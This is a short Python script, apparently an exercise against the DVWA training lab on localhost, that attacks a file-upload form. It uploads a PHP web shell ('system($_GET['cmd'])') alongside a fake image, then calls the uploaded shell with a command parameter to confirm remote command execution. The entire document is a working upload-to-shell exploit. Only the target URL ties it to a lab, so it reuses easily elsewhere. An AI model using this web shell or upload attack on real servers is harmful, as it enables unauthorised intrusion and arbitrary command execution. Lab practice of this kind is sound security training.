# Step 1: Discover upload endpoint
url = "http://localhost/DVWA/vulnerabilities/upload/"

# Step 2: Craft test payloads
files = {
    "safe_image": ("test.jpg", b"Fake image content", "image/jpeg"),
    "php_shell": ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php")
}

# Step 3: Test file upload
for file_name, (filename, content, content_type) in files.items():
    response = requests.post(url, files={"file": (filename, content, content_type)})
    if "File uploaded successfully" in response.text:
        print(f"{file_name} uploaded successfully.")
        # Attempt to access uploaded file
        file_url = f"http://localhost/DVWA/hackable/uploads/{filename}"
        execution_response = requests.get(file_url, params={"cmd": "ls"})
        if execution_response.status_code == 200:
            print(f"Execution possible at {file_url}")
        else:
            print(f"File inaccessible: {file_url}")